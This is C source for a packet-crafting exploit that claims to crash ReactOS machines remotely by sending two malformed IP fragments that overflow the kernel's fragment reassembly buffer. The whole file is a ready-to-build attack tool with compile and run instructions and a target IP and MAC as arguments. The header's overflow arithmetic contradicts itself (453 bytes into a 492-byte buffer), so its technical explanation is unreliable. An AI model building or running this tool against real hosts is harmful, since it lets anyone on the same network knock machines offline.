

/****************************************************************************
 *                                                                          *
 *        _._     _,-'""`-._                                               *
 *       (,-.`._,'(       |\`-/|                                            *
 *           `-.-' \ )-`( , o o)                                            *
 *                 `-    \`_`"'-                                             *
 *                                                                          *
 *   ReactOS remote kernel DoS                                              *
 *   IP fragment reassembly pool overflow -> BAD_POOL_HEADER BSOD           *
 *                                                                          *
 *   tcpip.sys ProcessFragment miscalculates FragLast when an IP            *
 *   fragment carries IHL > 5 (IP options). The reassembly buffer is        *
 *   sized from the first fragment's data length, but the second            *
 *   fragment's data is computed as TotalLen - IHL*4. With IHL=15           *
 *   and TotalLen=513, the kernel copies 453 bytes into a buffer            *
 *   sized for 500 - 8 (ICMP hdr) = 492. The trailing 39 bytes             *
 *   overflow into the adjacent kernel nonpaged pool block.                 *
 *                                                                          *
 *   two raw IP packets from linux, target BSODs within seconds.            *
 *   no authentication, no open ports needed, just L2 reachability.         *
 *                                                                          *
 *   tested on ReactOS 0.4.x i386                                          *
 *                                                                          *
 *   _SiCk // afflicted.sh                                                  *
 *                                                                          *
 *   build (linux):                                                         *
 *     gcc -o tcpip-dos tcpip-dos.c -O2                                    *
 *   run:                                                                   *
 *     sudo ./tcpip-dos <iface> <target-ip> <target-mac>                   *
 *                                                                          *
 ****************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#define ETH_HDR     14
#define FRAG1_IHL   5
#define FRAG1_DATA  500
#define FRAG2_IHL   15
#define FRAG2_DATA  453

struct iphdr_raw {
    unsigned char  ihl_ver;
    unsigned char  tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char  ttl;
    unsigned char  protocol;
    unsigned short check;
    unsigned int   saddr;
    unsigned int   daddr;
};

static unsigned char g_dst_mac[6];
static unsigned char g_src_mac[6];

static unsigned short cksum(void *data, int len)
{
    unsigned short *p = data;
    unsigned long sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(unsigned char *)p;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += sum >> 16;
    return ~sum;
}

static int parse_mac(const char *s, unsigned char *mac)
{
    return sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]) == 6;
}

static void get_iface_mac(const char *iface, unsigned char *mac)
{
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = 0;
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
}

static void banner(void)
{
    printf("\n");
    printf("    _._     _,-'\"\"\"``-._\n");
    printf("   (,-.`._,'(       |\\`-/|\n");
    printf("       `-.-' \\ )-`( , o o)\n");
    printf("             `-    \\`_`\"'-\n");
    printf("\n");
    printf("   REMOTE KERNEL DoS\n");
    printf("   ReactOS i386 - IP fragment pool overflow\n");
    printf("   _SiCk // afflicted.sh\n");
    printf("\n");
}

static int send_fragment(int fd, struct sockaddr_ll *sll,
    unsigned int saddr, unsigned int daddr,
    unsigned short id, unsigned char ihl,
    unsigned short frag_off, unsigned short mf,
    unsigned char *payload, int paylen)
{
    int hdrlen = ihl * 4;
    int totlen = hdrlen + paylen;
    int framelen = ETH_HDR + totlen;
    unsigned char *frame = calloc(1, framelen + 64);
    struct iphdr_raw *ip;

    memcpy(frame, g_dst_mac, 6);
    memcpy(frame + 6, g_src_mac, 6);
    frame[12] = 0x08;
    frame[13] = 0x00;

    ip = (struct iphdr_raw *)(frame + ETH_HDR);
    ip->ihl_ver  = (4 << 4) | ihl;
    ip->tot_len  = htons(totlen);
    ip->id       = htons(id);
    ip->frag_off = htons((mf ? 0x2000 : 0) | (frag_off & 0x1FFF));
    ip->ttl      = 64;
    ip->protocol = 1;
    ip->saddr    = saddr;
    ip->daddr    = daddr;
    ip->check    = 0;
    ip->check    = cksum(ip, hdrlen);

    memcpy(frame + ETH_HDR + hdrlen, payload, paylen);

    int ret = sendto(fd, frame, framelen, 0,
        (struct sockaddr *)sll, sizeof(*sll));
    free(frame);
    return ret;
}

int main(int argc, char *argv[])
{
    int fd;
    unsigned int ifidx;
    struct sockaddr_ll sll;
    unsigned int dst_ip;
    unsigned int src_ip;
    unsigned char payload1[FRAG1_DATA];
    unsigned char payload2[FRAG2_DATA];
    int overflow;

    if (argc < 4) {
        banner();
        printf("[*] %s <iface> <target-ip> <target-mac>\n", argv[0]);
        return 1;
    }

    setvbuf(stdout, 0, _IONBF, 0);
    banner();

    if (!parse_mac(argv[3], g_dst_mac)) {
        printf("[!] bad mac\n");
        return 1;
    }

    ifidx = if_nametoindex(argv[1]);
    if (!ifidx) { printf("[!] bad interface\n"); return 1; }

    get_iface_mac(argv[1], g_src_mac);
    dst_ip = inet_addr(argv[2]);
    src_ip = inet_addr("10.0.2.1");

    fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("[!] socket"); return 1; }

    {
        struct ifreq ifr;
        strncpy(ifr.ifr_name, argv[1], IFNAMSIZ-1);
        ifr.ifr_name[IFNAMSIZ-1] = 0;
        setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));
    }

    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = ifidx;
    sll.sll_halen    = 6;
    memcpy(sll.sll_addr, g_dst_mac, 6);

    printf("[*] target %s (%02x:%02x:%02x:%02x:%02x:%02x)\n",
        argv[2], g_dst_mac[0], g_dst_mac[1], g_dst_mac[2],
        g_dst_mac[3], g_dst_mac[4], g_dst_mac[5]);

    overflow = FRAG1_DATA - (8 + FRAG2_DATA);

    printf("[*] frag1: off=0 IHL=%d data=%d MF=1 (ICMP echo)\n",
        FRAG1_IHL, FRAG1_DATA);
    printf("[*] frag2: off=1 IHL=%d data=%d MF=0 (40 bytes IP opts)\n",
        FRAG2_IHL, FRAG2_DATA);
    printf("[*] reassembly buffer = %d, frag2 writes %d\n",
        FRAG1_DATA - 8, FRAG2_DATA);
    printf("[*] overflow = %d bytes into adjacent pool block\n", overflow);

    memset(payload1, 0x41, FRAG1_DATA);
    payload1[0] = 0x08;
    payload1[1] = 0x00;
    payload1[2] = 0x00;
    payload1[3] = 0x00;
    payload1[4] = 0xDE;
    payload1[5] = 0xAD;
    payload1[6] = 0x00;
    payload1[7] = 0x01;

    memset(payload2, 0x42, FRAG2_DATA);

    printf("[*] sending...\n");

    send_fragment(fd, &sll, src_ip, dst_ip,
        0x4141, FRAG1_IHL, 0, 1, payload1, FRAG1_DATA);
    usleep(50000);
    send_fragment(fd, &sll, src_ip, dst_ip,
        0x4141, FRAG2_IHL, 1, 0, payload2, FRAG2_DATA);

    printf("[+] sent - target BSODs (BAD_POOL_HEADER 0x19)\n");

    close(fd);
    return 0;
}
